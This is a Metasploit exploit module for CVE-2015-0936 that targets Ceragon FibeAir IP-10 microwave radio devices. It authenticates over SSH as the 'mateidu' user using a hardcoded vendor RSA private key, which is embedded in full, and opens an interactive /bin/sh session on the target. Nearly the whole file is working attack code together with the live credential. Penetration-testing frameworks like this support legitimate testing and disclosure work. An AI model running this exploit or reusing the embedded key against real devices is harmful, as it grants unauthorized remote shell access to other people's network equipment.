##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'net/ssh'

class MetasploitModule < Msf::Exploit::Remote
  include Msf::Auxiliary::Report

  Rank = ExcellentRanking

  def initialize(info = {})
    super(update_info(info, {
      'Name'        => 'Ceragon FibeAir IP-10 SSH Private Key Exposure',
      'Description' => %q{
        Ceragon ships a public/private key pair on FibeAir IP-10 devices
        that allows passwordless authentication to any other IP-10 device.
        Since the key is easily retrievable, an attacker can use it to
        gain unauthorized remote access as the "mateidu" user.
      },
      'Platform'    => 'unix',
      'Arch'        => ARCH_CMD,
      'Privileged'  => false,
      'Targets'     => [ [ "Universal", {} ] ],
      'Payload'     =>
        {
          'Compat'  => {
            'PayloadType'    => 'cmd_interact',
            'ConnectionType' => 'find',
          },
        },
      'Author'      => [
        'hdm', # Discovery
        'todb' # Metasploit module and advisory text (mostly copy-paste)
        ],
      'License'     => MSF_LICENSE,
      'References'  =>
        [
          ['CVE', '2015-0936'],
          ['URL', 'https://gist.github.com/todb-r7/5d86ecc8118f9eeecc15'], # Original Disclosure
        ],
      'DisclosureDate' => "Apr 01 2015", # Not a joke
      'DefaultOptions' => { 'PAYLOAD' => 'cmd/unix/interact' },
      'DefaultTarget' => 0
    }))

    register_options(
      [
        # Since we don't include Tcp, we have to register this manually
        Opt::RHOST(),
        Opt::RPORT(22)
      ], self.class
    )

    register_advanced_options(
      [
        OptBool.new('SSH_DEBUG', [ false, 'Enable SSH debugging output (Extreme verbosity!)', false]),
        OptInt.new('SSH_TIMEOUT', [ false, 'Specify the maximum time to negotiate a SSH session', 30])
      ]
    )

  end

  # helper methods that normally come from Tcp
  def rhost
    datastore['RHOST']
  end
  def rport
    datastore['RPORT']
  end

  def do_login(user)
    factory = Rex::Socket::SSHFactory.new(framework,self, datastore['Proxies'])
    opt_hash = {
      auth_methods:       ['publickey'],
      port:               rport,
      key_data:           [ key_data ],
      use_agent:          false,
      config:             false,
      proxy:              factory,
      non_interactive:    true
    }
    opt_hash.merge!(:verbose => :debug) if datastore['SSH_DEBUG']
    begin
      ssh_socket = nil
      ::Timeout.timeout(datastore['SSH_TIMEOUT']) do
        ssh_socket = Net::SSH.start(rhost, user, opt_hash)
      end
    rescue Rex::ConnectionError
      return nil
    rescue Net::SSH::Disconnect, ::EOFError
      print_error "#{rhost}:#{rport} SSH - Disconnected during negotiation"
      return nil
    rescue ::Timeout::Error
      print_error "#{rhost}:#{rport} SSH - Timed out during negotiation"
      return nil
    rescue Net::SSH::AuthenticationFailed
      print_error "#{rhost}:#{rport} SSH - Failed authentication"
      return nil
    rescue Net::SSH::Exception => e
      print_error "#{rhost}:#{rport} SSH Error: #{e.class} : #{e.message}"
      return nil
    end

    if ssh_socket

      # Create a new session from the socket, then dump it.
      conn = Net::SSH::CommandStream.new(ssh_socket, '/bin/sh', true)
      ssh_socket = nil

      return conn
    else
      return nil
    end
  end

  def exploit
    conn = do_login("mateidu")
    if conn
      print_good "#{rhost}:#{rport} - Successful login"
      handler(conn.lsock)
    end
  end

  def key_data
    <<EOF
-----BEGIN RSA PRIVATE KEY----- 
MIICWgIBAAKBgQCq+Sivv4W8lFaRoiUbjspBi4FH3PnfYX0pGRbPfM3gPRyqiR1M 
aju7eTYlOdh9UoVt+/NVeRb6sOdfwpphnBXI/dXgaO2lIEiIq5Evf30Crn6edNyj 
hRJ8ho4+lvXL36GLWZ4twbpqfG6uAeOMdu7vNI99/CAu8vdywLvUjZSlBQIBIwKB 
gATijCJHTPbCaN+W6x4LZN1NIPNstq6cYqlnHeiry14tobu6xlKj8xP8Jh5SHCDW 
eNdBtn7I8gcpoDXvngLJ8f5hsbk36nBm/WplkewVK1LLNoxcJeFXQnUkmqEWj/k6 
bcfwWQHUZP6l71/zAmCIpFsgP3ht6Xqts5w1Wa8W3X4vAkEA1jB3+56PR7jePMIy 
aLIiuu/Hc+MBeESXG8VQLFtf/U+oEP0Xg0DClDJVUV35e5a4DAc+XG36OmOiH7i1 
wvWi0wJBAMxZFchBt8PqHovbtjHejisZpmfL0x634Wmk6FTrWOVPjWx11jSq1ziC 
OncyYEzfwb/ayJjGbvkFdVXALqpWwccCQAw9SK9K452yyt7mhomjx3hleRyQoP+O 
5BA3KScbKg55lJNBqZJ4uqlh9j8p8P+/eDsznSnaZhH3EJQZLvUym5cCQGNBNnc1 
3OohQglqt5SQq3QFJPCWM1gQK6hXaYhVDeu47OuJsS+GLgWBFRVS+5MNmJ8D3caM 
RIeU79kxdcBzSC0CQQC2v/IKL63A6P6+kQvATDEAeajDosnwvEFy/Cw1vp99I7/+ 
Pgt3TNDAm23XiGIIxKc4LxglqG9U4ftw5ErzhJ9N 
-----END RSA PRIVATE KEY----- 
EOF
  end
end
